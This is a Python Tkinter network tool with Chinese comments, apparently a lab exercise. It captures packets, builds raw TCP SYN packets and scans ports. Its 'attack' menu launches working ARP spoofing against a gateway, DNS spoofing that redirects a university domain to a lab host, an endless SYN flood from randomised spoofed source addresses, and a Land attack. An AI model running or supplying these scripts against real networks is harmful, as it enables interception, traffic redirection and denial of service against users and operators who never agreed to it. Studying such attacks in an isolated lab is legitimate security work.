#-------------------------------------------------------------------------------
#
#Name:        check000.py
#
# Author:      余广新
#
# Created:     04/15/2020
# Copyright:   (c)ygx 2020
#===============================================================================
#程序功能说明
#点击-收包-菜单就调用sayhi函数抓一个数据包并将其基本信息在列表框中显示出来
#点击-发包-菜单就调用sayhi2函数发送一个自己构造的数据包(一个TCP连接的SYN数据包)
#点击-扫描-菜单就调用scan函数对某一个IP地址的主机进行指定范围的TCP端口扫描
#点击-选卡-菜单就调用chec函数打开在网卡列表中选定的网卡
#-------------------------------------------------------------------------------
from ctypes import *
from ctypes.util import find_library
import sys
import ctypes
import time
import string
import tkinter as tk
import platform as pf
from optparse import  OptionParser
import sys
from tkinter import *
from tkinter import messagebox
from tkinter import ttk
import check as check
from check import *
import random
import socket
from struct import *
import threading
from scapy.all import *
source_ip="192.168.1.116"
target_ip="192.168.1.133"
#计算校验和函数=========================
def checksum(msg):
    s = 0
    #每次取2个字节
    for i in range(0,len(msg)-1,2):
        w = (msg[i]<<8) + (msg[i+1])
        s = s+w
    s = (s>>16) + (s & 0xffff)
    s = (s>>16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

#创建IP头部函数===========================
def Create_ip_Header(source_ip,dest_ip):
    #ip头部选项
    version = 4    #版本号
    headerlen = 5  #首部长度
    hl_version = (version << 4) + headerlen  #版本号和首部长度连成一个字节
    tos = 0        #服务类型通常为0
    tot_len = 20 + 20 #IP数据包总长度，IP首部20个字节+TCP首部20个字节，如果TCP有数据部分则再加
    id = random.randrange(18000,65535,1)  #随机化一个包序号
    frag_off = 0x4000  #分片标志和片偏移
    ttl = 128          #生存时间
    protocol = 6  #上层协议，若TCP则为6
    check = 0     #首部校验和，初始为0
    saddr = socket.inet_aton(source_ip) #源IP地址
    daddr = socket.inet_aton(dest_ip)   #目的IP地址
    #以下将首部校验和算出并填入首部，返回
    ip_header = pack('!BBHHHBBH4s4s',hl_version,tos,tot_len,id,frag_off,ttl,protocol,check,saddr,daddr)
    ip_checksum = checksum(ip_header)
    ip_header = pack('!BBHHHBBH4s4s',hl_version,tos,tot_len,id,frag_off,ttl,protocol,ip_checksum,saddr,daddr)
    return ip_header

#创建TCP头部函数==============================
def create_tcp_header(source_ip,dest_ip,dest_port):
    #tcp首部各字段赋值
    source = random.randrange(32000,62000,1) #随机化一个源端口，目的端口是本函数参数dest_port
    seq = random.randrange(3000000000,4000000000,1)  #序号
    ack_seq = 0  #确认号
    doff = 5     #数据偏移，TCP首部20个字节
    offset_res = (doff << 4) + 0
    #以下是tcp六个控制标志位设置
    fin = 0
    syn = 1
    rst = 0
    psh = 0
    ack = 0
    urg = 0
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)  #标志位拼接
    window = 8192 #窗口
    check = 0     #校验和，初始为0
    urg_ptr = 0   #紧急指针
    tcp_header = pack('!HHLLBBHHH',source,dest_port,seq,ack_seq,offset_res,tcp_flags,window,check,urg_ptr)
    #以下伪首部各字段赋值
    source_address = socket.inet_aton(source_ip)
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = 6     #协议类型，TCP=6
    tcp_length = 20  #tcp报文长度，因为只有20个字节TCP首部，若有数据要加上数据长度
    psh = pack('!4s4sBBH',source_address,dest_address,placeholder,protocol,tcp_length)
    psh = psh + tcp_header
    tcp_checksum = checksum(psh) #计算TCP校验和
    #重新打包TCP头部，并填充正确的校验和
    tcp_header = pack('!HHLLBBHHH',source,dest_port,seq,ack_seq,offset_res,tcp_flags,window,tcp_checksum,urg_ptr)
    return tcp_header


class IP2MAC:
    def __init__(self):
        self.patt_mac = re.compile('([a-f0-9]{2}[-:]){5}[a-f0-9]{2}', re.I)

    def getMac(self, ip):
        sysstr = pf.system()
        if sysstr == 'Windows':
            macaddr = self.__forWin(ip)
        elif sysstr == 'Linux':
            macaddr = self.__forLinux(ip)
        else:
            macaddr = None
        return macaddr or '00-00-00-00-00-00'

    def __forWin(self, ip):
        os.popen('ping -n 1 -w 500 {} > nul'.format(ip))
        macaddr = os.popen('arp -a {}'.format(ip))
        macaddr = self.patt_mac.search(macaddr.read())
        if macaddr:
            macaddr = macaddr.group()
        else:
            macaddr = None
        return macaddr

    def __forLinux(self, ip):
        os.popen('ping -nq -c 1 -W 500 {} > /dev/null'.format(ip))
        result = os.popen('arp -an {}'.format(ip))
        result = self.patt_mac.search(result.read())
        return result.group() if result else None

#扫描一定范围端口函数==============================
def range_scan(source_ip,dest_ip,start_port,ends_port):
    global adhandle,pkt_data,header
    syn_ack_received = [] #开放端口存储列表
    packet=(c_ubyte * 100)()
    ## 目标mac地址(被扫描主机的MAC地址) 根据IP自动计算mac地址
    mac = IP2MAC().getMac(target_ip).replace('-','')
    packet[0]=eval('0x'+mac[0:2])
    packet[1]=eval('0x'+mac[2:4])
    packet[2]=eval('0x'+mac[4:6])
    packet[3]=eval('0x'+mac[6:8])
    packet[4]=eval('0x'+mac[8:10])
    packet[5]=eval('0x'+mac[10:12])
    ## 源mac地址(你的主机的选定网卡的MAC地址) 根据IP自动计算mac地址
    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
    packet[6]=eval('0x'+mac[0:2])
    packet[7]=eval('0x'+mac[2:4])
    packet[8]=eval('0x'+mac[4:6])
    packet[9]=eval('0x'+mac[6:8])
    packet[10]=eval('0x'+mac[8:10])
    packet[11]=eval('0x'+mac[10:12])
    ## 数据包类型（IP类型）
    packet[12]=0x08
    packet[13]=0x00
    for j in range(start_port,ends_port):
        ## 构造IP和TCP（SYN扫描）包头
        ip_header = Create_ip_Header(source_ip,dest_ip)
        tcp_header = create_tcp_header(source_ip,dest_ip,j)
        packetx = ip_header + tcp_header
        for i in range(40):
            packet[i+14]=packetx[i]
        ## 发出数据包
        if (pcap_sendpacket(adhandle,packet,60) != 0):
            sys.exit(3)
        res=pcap_next_ex(adhandle, byref(header), byref(pkt_data))
        while(res >= 0):
            if(res > 0):
                local_tv_sec = header.contents.ts.tv_sec
                ltime=time.localtime(local_tv_sec)
                timestr=time.strftime("%H:%M:%S", ltime)
                zbsj=str.format("时间:{0:s}.{1:d} 包长:{2:d}" ,timestr, header.contents.ts.tv_usec, header.contents.len)
                yuanmacdz=str.format("{0:02X}.{1:02X}.{2:02X}.{3:02X}.{4:02X}.{5:02X}",pkt_data[6],pkt_data[7],pkt_data[8],pkt_data[9],pkt_data[10],pkt_data[11])
                mudimacdz=str.format("{0:02X}.{1:02X}.{2:02X}.{3:02X}.{4:02X}.{5:02X}",pkt_data[0],pkt_data[1],pkt_data[2],pkt_data[3],pkt_data[4],pkt_data[5])
                macxy=str.format("{0:02X}{1:02X}",pkt_data[12],pkt_data[13])
                ipxy=str.format("{0:d}",pkt_data[23])
                yuanip=str.format("{0:d}.{1:d}.{2:d}.{3:d}",pkt_data[26],pkt_data[27],pkt_data[28],pkt_data[29])
                mudiip=str.format("{0:d}.{1:d}.{2:d}.{3:d}",pkt_data[30],pkt_data[31],pkt_data[32],pkt_data[33])
                yuandk=str.format("{0:d}",((pkt_data[34]<<8)+pkt_data[35]))
                mudidk=str.format("{0:d}",((pkt_data[36]<<8)+pkt_data[37]))
                tcpbz=str.format("{0:02X}",pkt_data[47])
                tree.insert("", END, text=zbsj, values=(yuanmacdz,mudimacdz,macxy,ipxy,yuanip,mudiip,yuandk,mudidk,tcpbz))
                if(pkt_data[23] == 0x06 and pkt_data[47] == 0x12 and pkt_data[34] == packet[36] and pkt_data[35] == packet[37]):
                    syn_ack_received.append(j)
                    break
                else:
                    res=pcap_next_ex(adhandle, byref(header), byref(pkt_data))
                    continue
            else:
                break
        if(res == -1):
                sys.exit(-1)
    return syn_ack_received

#=========================================主程序从这里开始===============================================================================================
root = Tk()
root.title("这是一个测试程序")
#设置标签和列表框========================================== 
bq2=Label(root,text="以下是主机当前可用网卡列表，选中后点击选卡菜单即可打开网卡，之后就可以收发数据包",font=('Fixedsys',11,''))
bq2.config(bg='blue',fg='yellow')
bq2['anchor'] = W
bq2.pack(side=TOP,fill=X)
lb2 = Listbox(root,height=7,font=('System',11,''))  #用来显示网卡列表的列表框
lb2.pack(side=TOP,fill=X)
#
bq3=Label(root,text="选中网卡的MAC地址-- IP   地  址--   子网掩码   --   默认网关   --",font=('Fixedsys',11,''))
bq3.config(bg='blue',fg='yellow')
bq3['anchor'] = W
bq3.pack(side=TOP,fill=X)
lb3 = Listbox(root,height=2,font=('System',11,''))  #用来显示网卡参数
lb3.pack(side=TOP,fill=X)
#设置标签和列表用于显示收到的数据包
bq1=Label(root,text="信息",font=('Fixedsys',11,''))
bq1.config(bg='blue',fg='yellow')
bq1['anchor'] = W
bq1.pack(side=TOP,fill=X)
#设置垂直滚动条及显示的位置 
#Tree组件添加Scrollbar组件的set()方法
lb = Listbox(root,height=2,font=('Fixedsys',11,'')) #用来显示信息的列表框
lb.pack(side=TOP,fill=X)


slb = Scrollbar(root)
slb.pack(side=RIGHT,fill=Y)
#Tree组件添加Scrollbar组件的set()方法
tree = ttk.Treeview(root,yscrollcommand=slb.set)      # #创建表格对象
tree["columns"] = ("源mac地址","目的mac地址","mac协议","IP协议","源IP地址","目的IP地址","源端口","目的端口","TCP标记")     # #定义列
tree.column("源mac地址", width=160)          # #设置列
tree.column("目的mac地址", width=160)        
tree.column("mac协议", width=100)         
tree.column("IP协议", width=100)
tree.column("源IP地址", width=165)
tree.column("目的IP地址", width=165)
tree.column("源端口", width=100)
tree.column("目的端口", width=100)
tree.column("TCP标记", width=100)
tree.heading("源mac地址", text="源mac地址",anchor='w')        # #设置显示的表头名
tree.heading("目的mac地址", text="目的mac地址",anchor='w')        # #设置显示的表头名
tree.heading("mac协议", text="mac协议",anchor='w')        # #设置显示的表头名
tree.heading("IP协议", text="IP协议",anchor='w')
tree.heading("源IP地址", text="源IP地址",anchor='w')
tree.heading("目的IP地址", text="目的IP地址",anchor='w')
tree.heading("源端口", text="源端口",anchor='w')
tree.heading("目的端口", text="目的端口",anchor='w')
tree.heading("TCP标记", text="TCP标记",anchor='w')
tree.pack(side=RIGHT,fill=BOTH)
#设置Scrollbar组件的command选项为该组件的yview()方法
slb.config(command=tree.yview)


#以下开始准备打开网卡=============================================
header = POINTER(pcap_pkthdr)()
pkt_data = POINTER(c_ubyte)()
alldevs=POINTER(pcap_if_t)()
adhandle=POINTER(pcap_t)()
errbuf= create_string_buffer(PCAP_ERRBUF_SIZE)

##以下开始获取网卡列表========================================
MAX_ADAPTER_DESCRIPTION_LENGTH = 128
MAX_ADAPTER_NAME_LENGTH = 256
MAX_ADAPTER_ADDRESS_LENGTH = 8
class IP_ADDR_STRING(Structure):
    pass
LP_IP_ADDR_STRING = POINTER(IP_ADDR_STRING)
IP_ADDR_STRING._fields_ = [
    ("next", LP_IP_ADDR_STRING),
    ("ipAddress", c_char * 16),
    ("ipMask", c_char * 16),
    ("context", c_ulong)]
class IP_ADAPTER_INFO (Structure):
    pass
LP_IP_ADAPTER_INFO = POINTER(IP_ADAPTER_INFO)
IP_ADAPTER_INFO._fields_ = [
    ("next", LP_IP_ADAPTER_INFO),
    ("comboIndex", c_ulong),
    ("adapterName", c_char * (MAX_ADAPTER_NAME_LENGTH + 4)),
    ("description", c_char * (MAX_ADAPTER_DESCRIPTION_LENGTH + 4)),
    ("addressLength", c_uint),
    ("address", c_ubyte * MAX_ADAPTER_ADDRESS_LENGTH),
    ("index", c_ulong),
    ("type", c_uint),
    ("dhcpEnabled", c_uint),
    ("currentIpAddress", LP_IP_ADDR_STRING),
    ("ipAddressList", IP_ADDR_STRING),
    ("gatewayList", IP_ADDR_STRING),
    ("dhcpServer", IP_ADDR_STRING),
    ("haveWins", c_uint),
    ("primaryWinsServer", IP_ADDR_STRING),
    ("secondaryWinsServer", IP_ADDR_STRING),
    ("leaseObtained", c_ulonglong),
    ("leaseExpires", c_ulonglong)]
GetAdaptersInfo = windll.iphlpapi.GetAdaptersInfo
GetAdaptersInfo.restype = c_ulong
GetAdaptersInfo.argtypes = [LP_IP_ADAPTER_INFO, POINTER(c_ulong)]
adapterList = (IP_ADAPTER_INFO * 20)()
buflen = c_ulong(sizeof(adapterList))
## 在列表框中显示网卡列表并打开列表中第一个网卡==========================================
rc = GetAdaptersInfo(byref(adapterList[0]), byref(buflen))
if rc == 0:
    for i in range(0,20):
        a=adapterList[i]
        if a.comboIndex != 0:
            a.adapterName=b'\\Device\\NPF_'+a.adapterName
            lb2.insert(END,"%d.%s" % (i,a.description.decode('utf-8')))
a=adapterList[0]
adhandle = pcap_open_live(a.adapterName,65536,1,200,errbuf)
if (adhandle == None):
    lb.insert(END,"open_live error")
lb3.insert(END,"%02X.%02X.%02X.%02X.%02X.%02X----------%s--------%s--------%s" % (a.address[0],a.address[1],a.address[2],a.address[3],a.address[4],a.address[5],a.ipAddressList.ipAddress.decode("utf-8"),a.ipAddressList.ipMask.decode("utf-8"),a.gatewayList.ipAddress.decode("utf-8")))

timeronoff=False
#定时接收数据包=========================
def dsjs():
    global timer
    global adhandle
    res=pcap_next_ex(adhandle, byref(header), byref(pkt_data))
    #while(res >= 0):
    if(res > 0):    #如果收到数据包则显示在表格
        local_tv_sec = header.contents.ts.tv_sec
        ltime=time.localtime(local_tv_sec)
        timestr=time.strftime("%H:%M:%S", ltime)
        zbsj=str.format("时间:{0:s} 包长:{1:d}" ,timestr, header.contents.len) #("时间:{0:s}.{1:d} 包长:{2:d}" ,timestr, header.contents.ts.tv_usec, header.contents.len)
        yuanmacdz=str.format("{0:02X}.{1:02X}.{2:02X}.{3:02X}.{4:02X}.{5:02X}",pkt_data[6],pkt_data[7],pkt_data[8],pkt_data[9],pkt_data[10],pkt_data[11])
        mudimacdz=str.format("{0:02X}.{1:02X}.{2:02X}.{3:02X}.{4:02X}.{5:02X}",pkt_data[0],pkt_data[1],pkt_data[2],pkt_data[3],pkt_data[4],pkt_data[5])
        macxy=str.format("{0:02X}{1:02X}",pkt_data[12],pkt_data[13])
        ipxy=str.format("{0:d}",pkt_data[23])
        yuanip=str.format("{0:d}.{1:d}.{2:d}.{3:d}",pkt_data[26],pkt_data[27],pkt_data[28],pkt_data[29])
        mudiip=str.format("{0:d}.{1:d}.{2:d}.{3:d}",pkt_data[30],pkt_data[31],pkt_data[32],pkt_data[33])
        yuandk=str.format("{0:d}",((pkt_data[34]<<8)+pkt_data[35]))
        mudidk=str.format("{0:d}",((pkt_data[36]<<8)+pkt_data[37]))
        tcpbz=str.format("{0:02X}",pkt_data[47])
        tree.insert("", END, text=zbsj, values=(yuanmacdz,mudimacdz,macxy,ipxy,yuanip,mudiip,yuandk,mudidk,tcpbz)) 
    if(res == -1):
        sys.exit(-1)
    timer = threading.Timer(0.5,dsjs)
    timer.start()

timer = threading.Timer(0.5,dsjs)
## 收包按钮代码==========================================================
def sayhi():
    global timeronoff,timer
    if timeronoff:
        timeronoff=False
        timer.cancel()
    else:
        timeronoff=True
        timer = threading.Timer(0.5,dsjs)
        timer.start()
#btnsayhi.bind("<Button-1>",sayhi)

## 发包按钮代码===========================================================
def sayhi2():
    global adhandle
    packet=(c_ubyte * 200)()
    ## 目标mac地址(被扫描主机的MAC地址) 
    packet[0]=0x00
    packet[1]=0x0c
    packet[2]=0x29
    packet[3]=0x24
    packet[4]=0xe1
    packet[5]=0x39
    ## 源mac地址(你的主机的选定网卡的MAC地址) 
    packet[6]=0x00
    packet[7]=0x50
    packet[8]=0x56
    packet[9]=0xc0
    packet[10]=0x00
    packet[11]=0x01
    ## 数据包类型（IP类型）
    packet[12]=0x08
    packet[13]=0x00
    ## 构造IP和TCP（SYN扫描）包头
    ip_header = Create_ip_Header(source_ip,target_ip)  #源IP地址，目的IP地址
    tcp_header = create_tcp_header(source_ip,target_ip,80)  #源IP地址，目的IP地址和目的端口号
    packetx = ip_header + tcp_header
    #以下将MAC数据帧首部和IP及TCP首部合成一个完整数据包
    for i in range(40):
        packet[i+14]=packetx[i]
    ## 发出数据包（60个字节长，其中MAC数据帧首部14字节+IP首部20字节+TCP首部20字节+6个数据字节0）
    if (pcap_sendpacket(adhandle,packet,60) != 0):
        sys.exit(3)
#btnsayhi2.bind("<Button-1>",sayhi2)

## 扫描按钮代码========================================================
def scan():
    ipsource = source_ip #源IP地址（本主机选定网卡的IP地址）
    ipdest   = target_ip #目的IP地址（被扫描的）
    start = 78   #扫描开始端口号
    stop  = 82   #扫描结束端口号
    #以下设置当前网卡抓取数据包条件
    netmask = 0x0ffffff
    fcode = bpf_program()
    fcodebuf = create_string_buffer("tcp".encode())  #设置只抓取TCP报文
    res = pcap_compile(adhandle,byref(fcode),fcodebuf,1,netmask)
    if (res < 0):
        lb.insert(END,"compile error")
    if (pcap_setfilter(adhandle , byref(fcode))<0):
        lb.insert(END,"setfilter error")
        pcap_close(adhandle)
    #开始扫描
    opl = range_scan(ipsource,ipdest,start,stop)
    lb.insert(END,"扫描到开放TCP端口数=%d" % (len(opl)))
    dklist=""
    for i in range(len(opl)):
        dklist=dklist+"["+str(opl[i])+"]"
    lb.insert(END,"开放TCP端口列表: %s" % dklist)
#btnscan.bind("<Button-1>",scan)

## 选择网卡按钮代码===============================================================
def chec():
    global adhandle,alldevs,adapterList
    i = lb2.curselection()[0]
    i = int((lb2.get(i)[0]).split('.')[0])
    a=adapterList[i]
    adhandle = pcap_open_live(a.adapterName,65536,1,200,errbuf)
    if (adhandle == None):
        lb.insert(END,"open_live error")
    lb3.delete(0,1)
    lb3.insert(END,"%02X.%02X.%02X.%02X.%02X.%02X----------%s--------%s--------%s" % (a.address[0],a.address[1],a.address[2],a.address[3],a.address[4],a.address[5],a.ipAddressList.ipAddress.decode("utf-8"),a.ipAddressList.ipMask.decode("utf-8"),a.gatewayList.ipAddress.decode("utf-8")))
#btnsele.bind("<Button-1>",chec)



#ARP欺骗
def arpTrick(targetIp,interFACE):
    # 欺骗目标设备
    # network interface card
    # 目标ip
    tip = targetIp
    # 我的ip
    lip = source_ip
    # 网关ip
    gip = "192.168.1.1"
    tmac = getmacbyip(tip)
    lmac = get_if_hwaddr(interFACE)
    gmac = getmacbyip(gip)

    pack = Ether(dst=tmac, src=lmac) / ARP(op=1, hwsrc=lmac, psrc=gip, hwdst=tmac, pdst=tip)
    while True:
        sendp(pack, inter=2, iface=interFACE)

def arpRUN():
    interFACE= lb2.get(lb2.curselection()[0]).split('.')[1] #网卡名称
    tarGetIp = set([tree.item(domain, "values")[5]
                    for domain in tree.selection()
                    if tree.item(domain, "values")[5] != source_ip])
    for ip in tarGetIp:
        arpAttack=threading.Thread(target=arpTrick,args=(ip,interFACE))
        arpAttack.start()

#dns欺骗
def DNS_Spoof(data):
        # ip_fields = data.getlayer(IP).fields
        # udp_fields = data.getlayer(UDP).fields
        # dns_fields = data.getlayer(DNS).fields
        req_domain = data[DNS].qd.qname
        print(str(req_domain).split("'")[1])
        if 'sspu' in str(req_domain):
                print('目标主机开始访问www.sspu.edu.cn')
            #if str(req_domain).split("'")[1].find('baidu.com'):
                print(str(req_domain))
                del (data[UDP].len)
                del (data[UDP].chksum)
                del (data[IP].len)
                del (data[IP].chksum)
                res = data.copy()
                res.FCfield = 2
                res.src, res.dst = data.dst, data.src
                res[IP].src, res[IP].dst = data[IP].dst, data[IP].src
                res.sport, res.dport = data.dport, data.sport
                res[DNS].qr = 1
                res[DNS].ra = 1
                res[DNS].ancount = 1
                res[DNS].an = DNSRR(
                    rrname = req_domain,
                    type = 'A',
                    rclass = 'IN',
                    ttl = 900,
                    rdata = '192.168.1.133'
                )
                sendp(res)



def DNS_S(iface):
    sniff(prn=DNS_Spoof,filter='udp dst port 53',iface=iface)

def dnsRUN():
    interFACE= lb2.get(lb2.curselection()[0]).split('.')[1] #网卡名称
    dnsAttack = threading.Thread(target=DNS_S, args=(interFACE,))
    dnsAttack.start()

#syn洪水攻击
def synFlood(targetIp):
    while True:
        for i in range(10000):
            #构造随机的源IP
            sip='%i.%i.%i.%i'%(
                random.randint(1, 255),
                random.randint(1, 255),
                random.randint(1, 255),
                random.randint(1, 255)
                )
            #构造随机的端口
            sport=random.randint(1,65535)
            packet=IP(src=sip,dst=targetIp)/TCP(sport=sport,dport=81,flags="S")
            send(packet)

def synRUN():
    tarGetIp = set([tree.item(domain, "values")[5]
                    for domain in tree.selection()
                    if tree.item(domain, "values")[5] != source_ip])
    for ip in tarGetIp:
        synAttack=threading.Thread(target=synFlood,args=(ip,))
        synAttack.start()

#land攻击
def landFlood(tarGetIp):
    packet = IP(src=tarGetIp, dst=tarGetIp) / TCP(sport=81, dport=81, flags="S")
    while True:
        send(packet,count=100,verbose=1)

def landRUN():
    tarGetIp = set([tree.item(domain, "values")[5]
                    for domain in tree.selection()
                    if tree.item(domain, "values")[5] != source_ip])
    for ip in tarGetIp:
        landAttack=threading.Thread(target=landFlood,args=(ip,))
        landAttack.start()



#======================================主程序消息循环结束===========================================
## 关闭网卡
if (adhandle != None):
    pcap_close(adhandle)
#=======以下创建菜单==================
menubar = Menu(root)
attackMenu=Menu(menubar,tearoff=0)
menubar.add_command(label='收包', command=sayhi)
menubar.add_command(label='发包', command=sayhi2) 
menubar.add_command(label='扫描', command=scan) 
menubar.add_command(label='选卡', command=chec)
attackMenu.add_command(label='ARP欺骗',command=arpRUN)
attackMenu.add_command(label='DNS欺骗',command=dnsRUN)
attackMenu.add_command(label='泪滴攻击')
attackMenu.add_command(label='SYN洪水攻击',command=synRUN)
attackMenu.add_command(label='Land攻击',command=landRUN)
attackMenu.add_command(label='Smurf攻击')
menubar.add_cascade(label='攻击', menu=attackMenu)
menubar.add_command(label='退出', command=root.destroy)
root.config(menu=menubar)  #虽然menu 已经创建，但是还没添加到root 
#======================================主程序消息循环开始===========================================
root.mainloop()

